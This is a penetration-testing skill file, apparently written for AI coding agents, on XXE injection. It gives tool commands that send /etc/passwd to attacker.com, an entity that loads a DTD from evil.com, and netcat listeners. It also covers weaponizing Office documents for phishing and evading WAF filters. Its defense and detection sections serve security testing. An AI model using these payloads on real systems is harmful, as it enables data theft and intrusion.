---
name: web-xxe
description: "XML External Entity (XXE) injection exploits vulnerable XML parsers to read local files, initiate SSRF attacks, exfiltrate data through out-of-band channels, and cause denial of service."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 6
  guide_count: 3
  owasp: "A05:2021-Security Misconfiguration"
---




# Skill: XML External Entity (XXE) Injection

> **Supplementary Files**:
> - `payloads.md` -- XXE attack payloads organized by category (basic detection, file disclosure, blind XXE, OOB exfiltration, XXE to SSRF, Office document XXE, WAF bypass)
> - `test-cases.md` -- Structured test cases with severity levels, preconditions, and expected results (6 test cases covering XXE detection through Office document exploitation)

## Summary

Web Xxe skill domain covering web attack operations.

**Tools**: XXEinjector, oxml_xxe, xxeplus, Burp Suite, odat, netcat

**Domain**: web-attack

**OWASP**: A05:2021-Security Misconfiguration

## Description

XML External Entity (XXE) injection exploits vulnerable XML parsers to read local files, initiate SSRF attacks, exfiltrate data through out-of-band channels, and cause denial of service. XXE arises when applications process user-supplied XML without disabling external entity resolution or DTD processing. The attack leverages the XML specification's built-in features -- entity definitions and external references -- which were designed for document modularity but become attack vectors when applied to untrusted input.

**Core Attack Types**:

- **Classic XXE**: Direct file disclosure through in-band entity injection. The server resolves the external entity and returns file contents in the HTTP response. Most effective against SOAP endpoints, REST APIs accepting XML, and file upload features processing XML-based formats (SVG, DOCX, XLSX).
- **Blind XXE**: The server processes the external entity but does not return the result in the response. Requires out-of-band (OOB) channels (DNS, HTTP, FTP) to exfiltrate data. Common against applications that silently parse XML without reflecting content.
- **Error-Based XXE**: Leverages XML parser error messages that include entity content. When the parser fails on malformed data, error output may contain the resolved entity value, providing indirect file disclosure.
- **XXE to SSRF**: Uses external entities to force the XML parser to make requests to internal services, accessing cloud metadata endpoints, internal APIs, and private network resources.

**Advanced Vectors**: Parameter entity exploitation for DTD-based attacks, Office document (OOXML) injection via oxml_xxe for social engineering delivery, multi-stage payload construction for WAF bypass, and XXE combined with XInclude for injection points that only control partial XML content.

---

## Use Cases

1. **Web Application Penetration Testing**: Identify XML-processing endpoints (SOAP, REST APIs, file uploads, SVG processing) and exploit XXE to read server files, access internal services, or achieve SSRF.
2. **Cloud Environment Assessment**: Use XXE to SSRF to reach cloud metadata endpoints (AWS/GCP/Azure), extracting temporary credentials and instance configuration from behind the trust boundary.
3. **Social Engineering Delivery**: Craft weaponized Office documents (DOCX, XLSX, PPTX) with embedded XXE payloads using oxml_xxe, distributing them via phishing campaigns to trigger server-side XML processing on document management systems.
4. **Bug Bounty Hunting**: Quickly identify XML input points on target applications, construct layered OOB exfiltration payloads, and demonstrate high-impact file disclosure or SSRF to internal resources.
5. **Security Code Audit**: Review XML parser configuration across the application stack, identify libraries with external entity resolution enabled by default, and verify that defense measures (disabling DTDs, entity resolution) are correctly implemented.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **XXEinjector** | Automated XXE exploitation with OOB exfiltration, supports blind XXE via DNS/HTTP/FTP channels | `ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --oob=http --verbose` |
| **oxml_xxe** | Weaponize Office documents (DOCX/XLSX/PPTX) with embedded XXE payloads for social engineering | `python3 oxml_xxe.py --file template.docx --inject --payload xxe.dtd --output malicious.docx` |
| **xxeplus** | Advanced XXE exploitation toolkit with WAF bypass, encoding obfuscation, and multi-stage payload construction | `python3 xxeplus.py --target http://target/api --method POST --payload blind-xxe` |
| **Burp Suite** | Manual testing, request interception, payload encoding, Collaborator for blind XXE OOB detection | Repeater module with custom XML payload; Collaborator tab for OOB callback monitoring |
| **odat** | Oracle database TNS listener exploitation via XXE, including database credential extraction and OS command execution | `odat.py utlhttp --server-ip target --server-port 1521 --dSid ORCL --getFile /etc/passwd` |
| **netcat** | Set up listener for HTTP/FTP OOB exfiltration channels to receive leaked data | `nc -lvnp 80` or `nc -lvnp 2121` for FTP-based data capture |

Auxiliary tools: **curl** (quick payload testing), **Python http.server** (simple HTTP listener for OOB callbacks), **Burp Collaborator** (managed OOB infrastructure), **interactsh** (open-source OOB callback service), **xmllint** (local XML validation and parser behavior testing).

---

## Methodology

### Attack Chain

```
[1] Endpoint Discovery     [2] Basic XXE Test       [3] Escalation
    - SOAP / REST APIs         - Classic file read       - Blind XXE (OOB)
    - File uploads (XML)       - /etc/passwd proof       - Error-based XXE
    - SVG / DOCX parsing       - Entity injection        - XXE to SSRF
    - Content-Type fuzz             |                    - Parameter entities
                                     v                    - XInclude injection
                                [4] Exfiltration        [5] Weaponize
                                    - OOB DNS channel       - Office document XXE
                                    - OOB HTTP/FTP          - oxml_xxe crafting
                                    - Multi-stage DTD       - Social engineering
                                    - WAF bypass encoding   - Delivery vectors
```

**Key Principle**: Every XXE test must confirm three elements -- (1) the application accepts XML input, (2) the XML parser resolves external entities, and (3) the resolved content can be recovered (in-band, error-based, or OOB).

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **Disable DTDs** | Set parser feature to disallow DTD processing entirely | Most effective defense; eliminates all XXE vectors at once |
| **Disable External Entities** | Configure parser to not resolve general external entities | Required when DTDs are needed for validation; disable general and parameter entities separately |
| **Disable Parameter Entities** | Block parameter entity resolution specifically | Parameter entities enable DTD-based attacks even when general entities are disabled |
| **Input Validation** | Whitelist allowed XML content, reject DTD definitions | Defense-in-depth; validate that incoming XML does not contain DOCTYPE or ENTITY declarations |
| **XML Parser Hardening** | Platform-specific secure configuration for libxml2, Xerces, .NET XmlReader | Each parser has unique configuration flags; verify per-library documentation |
| **WAF/IPS Rules** | Block requests containing DOCTYPE, ENTITY, SYSTEM, PUBLIC keywords | Supplementary control; should not be sole defense as encoding and obfuscation can bypass |

---

## Practical Steps

### 1. Detect XML-Processing Endpoints
Identify all endpoints that accept, parse, or process XML content. Test SOAP web services, REST APIs with XML content types (`application/xml`, `text/xml`), file upload features that process XML-based formats (SVG images, Office documents, RSS feeds), and any endpoint that echoes XML content in responses. Use Content-Type fuzzing to discover endpoints that accept XML even when not advertised.

### 2. Test Basic XXE File Disclosure
Inject a classic XXE payload to read `/etc/passwd` (or `/etc/hostname` for lower impact). If the parser resolves external entities and the response includes the file content, the vulnerability is confirmed in-band. Use `file:///etc/passwd` for local file access and `http://` entities for SSRF validation.

### 3. Escalate to Blind XXE
When the response does not contain entity content, switch to OOB techniques. Host a DTD file on an attacker-controlled server that defines parameter entities to load file content and exfiltrate it via DNS lookups or HTTP requests. Use XXEinjector for automated blind XXE exploitation with multiple exfiltration channels.

### 4. Exfiltrate Data via OOB Channels
Set up netcat listeners or a Python HTTP server to receive exfiltrated data. Construct multi-stage DTD payloads where the first entity reads a file and the second entity sends the content to the attacker's listener via HTTP GET parameters or FTP. For DNS exfiltration, encode file content as subdomain labels in DNS queries to an attacker-controlled authoritative DNS server.

### 5. Weaponize Office Documents
Use oxml_xxe to inject XXE payloads into legitimate Office document templates (DOCX, XLSX, PPTX). These documents use OOXML format internally, which is XML-based and processed by many document management systems, antivirus engines, and collaboration platforms. Combine with social engineering (phishing emails, shared documents) to deliver the weaponized files to targets that automatically process uploaded documents server-side.

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.**

---

## Common Pitfalls

- **Testing only SOAP endpoints**: XXE is not limited to SOAP services. REST APIs accepting XML, SVG image uploads, Office document processing pipelines, SAML assertion handling, and XML-RPC interfaces are all common XXE vectors. A comprehensive test must cover every endpoint that touches XML.
- **Giving up after in-band failure**: If a basic XXE payload does not return file content in the response, the parser may still be vulnerable. Blind XXE through OOB channels, error-based XXE through induced parser errors, and parameter entity exploitation can succeed where classic in-band injection fails.
- **Ignoring parameter entities**: General entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) are blocked more frequently than parameter entities (`<!ENTITY % dtd SYSTEM "http://evil.com/payload.dtd"> %dtd;`). Parameter entities are resolved within DTDs and enable powerful multi-stage attacks that bypass many filters.
- **Overlooking Content-Type fuzzing**: An endpoint may accept XML even if the documentation specifies JSON. Sending a valid XML body with `Content-Type: application/xml` to JSON APIs can reveal hidden XML processing paths.

---

## Automation and Scripting

Automate XXE discovery by fuzzing Content-Type headers with XML payloads across all API endpoints using Burp Suite Intruder or custom Python scripts. Use XXEinjector for automated blind XXE exploitation -- it handles DTD hosting, payload construction, and data extraction across HTTP, DNS, and FTP channels. Script multi-stage payloads with Python to dynamically generate DTD files that target different file paths based on initial reconnaissance results. For Office document testing, use oxml_xxe in batch mode to inject payloads into multiple document templates simultaneously, then upload them to the target's document processing system.

---

## Reporting and Documentation

XXE findings must document the vulnerable endpoint, the complete XML payload used, and the data disclosed or the SSRF achieved. For file disclosure, include the specific files read and their sensitivity (credentials in configuration files, PII in application data, internal network topology from `/etc/hosts`). For XXE to SSRF, document the internal services accessible through the XML parser and any cloud metadata credentials exposed. Provide the exact parser configuration change needed to remediate (specific flags, methods, or library upgrades) rather than generic "disable external entities" advice.

---

## Legal and Ethical Considerations

XXE file disclosure can expose highly sensitive data including database credentials, API keys, and user personal information. Limit file reads to demonstrating impact (e.g., `/etc/hostname`, `/etc/passwd` with redacted content) rather than reading entire databases or credential stores. When testing OOB exfiltration, ensure the attacker-controlled server is secured and all received data is handled according to the engagement rules. Office document XXE testing in social engineering scenarios requires explicit written authorization covering phishing simulation.

---

## Integration with Other Tools

XXE findings chain directly into multiple attack paths. File disclosure of configuration files feeds into credential-based attacks (database access, SSH login). XXE to SSRF connects to the web-ssrf skill for cloud metadata extraction and internal service enumeration. Office document XXE vectors integrate with social-engineering skill for phishing delivery campaigns. Blind XXE OOB infrastructure (HTTP listeners, DNS servers) can be reused for other OOB testing across the engagement. Use XXE as a pivot point to expand assessment scope within authorized boundaries.

---

## Case Studies and Examples

- **SOAP API XXE file disclosure**: A financial application's SOAP web service accepted XML requests for transaction processing. By injecting an external entity pointing to `file:///etc/passwd`, the attacker read system files. Further exploitation revealed database credentials in `/app/config/database.xml`, leading to full database compromise.
- **Blind XXE via SVG upload**: An image processing service accepted SVG file uploads. The SVG was parsed server-side for thumbnail generation without disabling external entities. A blind XXE payload in the SVG DTD exfiltrated `/proc/self/environ` contents via HTTP to an attacker server, revealing AWS access keys in environment variables.
- **Office document XXE in DMS**: A document management system automatically processed uploaded DOCX files to extract metadata and generate previews. An attacker crafted a malicious DOCX using oxml_xxe that contained an XXE payload in `word/document.xml`. When the DMS parsed the document server-side, it resolved external entities, sending internal configuration file contents to the attacker's FTP server.

---

## Detection Methods

XXE attacks are detected through: web application firewalls that flag DOCTYPE, ENTITY, or SYSTEM keywords in request bodies, XML parser error logs showing entity resolution failures, server-side monitoring of outbound connections from the application process (especially to unexpected hosts), DNS query logs showing unusual lookups from the application server, and file integrity monitoring detecting unexpected file access patterns by the application process. Defenders should disable DTD processing by default, log all XML parsing errors, and monitor for outbound connections from XML processing components.

---

## Defense Evasion Techniques

Evade XXE detection by: encoding entity declarations in UTF-16 or other character encodings to bypass keyword-based WAF rules that only inspect ASCII, using parameter entities instead of general entities to bypass entity-specific filters, splitting DOCTYPE declarations across multiple lines or using XML comments to break pattern matching, leveraging XInclude as an alternative injection vector when DOCTYPE is filtered, and using custom protocol handlers (expect://, php://filter) when the XML parser supports them to bypass file:// restrictions.

---

## Advanced Techniques

Advanced XXE exploitation includes: multi-stage DTD payloads where a remote DTD defines parameter entities that construct exfiltration URLs dynamically, XSLT injection combined with XXE for code execution in XSLT-capable processors, XXE through SAML assertions in single sign-on systems that parse XML assertion payloads, exploiting chained entity expansion (billion laughs) for denial of service, and using the `expect://` protocol handler in PHP for direct command execution through XXE. For .NET environments, explore `System.Xml.XmlReader` settings and `XmlResolver` configuration for bypass opportunities.

---

## Tool Comparison Matrix

| Tool | Best For | Automation | Skill Level |
|------|----------|------------|-------------|
| **XXEinjector** | Automated blind XXE with OOB exfiltration | Fully automated | Intermediate |
| **oxml_xxe** | Office document XXE payload injection | Semi-automated | Intermediate |
| **xxeplus** | WAF bypass and multi-stage payloads | Semi-automated | Advanced |
| **Burp Suite** | Manual testing and Collaborator OOB detection | Manual | Beginner |
| **odat** | Oracle database XXE exploitation | Semi-automated | Advanced |
| **netcat** | Simple OOB listener setup | Manual | Beginner |

---

## Hacker Laws

1. **Minimize Attack Surface** -- XXE exists because the application accepts XML input and the parser has overly permissive configuration. Defense starts with disabling DTD processing and external entity resolution on all XML parsers, not just those facing user input. Internal services processing forwarded XML are equally vulnerable.
2. **Trust but Verify** -- Never trust that an XML library's default configuration is secure. Many parsers (especially older versions of libxml2, Java's DocumentBuilderFactory, Python's lxml) enable external entity resolution by default. Verify the actual parser configuration in the running application, not just the documentation claims.
3. **Defense in Depth** -- A single defense measure (WAF blocking DOCTYPE keywords) is insufficient. Implement parser hardening (disable DTDs) plus input validation (reject XML with entity declarations) plus network monitoring (detect outbound connections from XML processing) plus file access controls (restrict what the application process can read).
4. **Assume Breach** -- If an application processes XML from external sources, assume an attacker will discover XXE vectors. Design the architecture so that even successful XXE exploitation yields minimal value: the application process runs with minimal file read permissions, sensitive credentials are not stored in files accessible to the application, and outbound network access from the application server is restricted.

---

## Learning Resources

**Supplementary files for this skill**: payloads.md, test-cases.md

**Related skills**:
- `skills/web-ssrf/SKILL.md` -- SSRF: XXE to SSRF chain exploitation
- `skills/web-auth-bypass/SKILL.md` -- Authentication bypass: SAML XXE vectors
- `skills/social-engineering/SKILL.md` -- Social engineering: Office document delivery

**External resources**:
- [PortSwigger Web Security Academy - XXE](https://portswigger.net/web-security/xxe)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [HackTricks - XXE Exploitation](https://book.hacktricks.xyz/pentesting-web/xxe-xee)
- [XXEinjector - Automated XXE Exploitation](https://github.com/enjoiz/XXEinjector)
- [oxml_xxe - Office Document XXE Tool](https://github.com/BuffaloWill/oxml_xxe)
- [Timur Zinniatullin - XXE OOB Research](https://research.appsecco.com/)
